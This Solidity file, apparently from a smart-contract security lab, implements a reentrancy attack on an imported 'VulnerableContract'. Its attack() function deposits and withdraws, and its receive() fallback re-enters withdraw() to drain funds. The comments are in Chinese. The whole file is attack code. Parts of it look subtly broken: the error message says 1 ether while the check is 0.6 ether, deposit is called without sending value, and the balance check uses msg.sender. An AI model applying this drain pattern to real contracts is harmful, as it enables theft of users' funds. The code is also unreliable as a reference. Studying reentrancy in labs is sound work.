// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackContract {
    event LogMessage(string message, uint256 value);
    VulnerableContract public vulnerableContract;
    address payable private account;

    constructor(
        address _vulnerableContractAddress,
        address payable AccountAddress
    ) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
        account = AccountAddress;
    }

    // 攻击函数，初始化攻击时调用
    function attack() public payable {
        require(
            getBalance() >= 600000000000000000,
            "Minimum 1 ether to attack"
        );
        // 首次存款
        vulnerableContract.deposit(2000000000000000000);
        // 触发首次提现
        vulnerableContract.withdraw(2000000000000000000);
    }

    // 回调函数，用于重入攻击
    receive() external payable {
        emit LogMessage("Entered", 0);
        if (getBalance() >= 600000000000000000) {
            vulnerableContract.withdraw(600000000000000000);
        }
    }

    // 获取攻击合约余额
    function getBalance() public view returns (uint256) {
        return vulnerableContract.getBalance(msg.sender);
    }
}
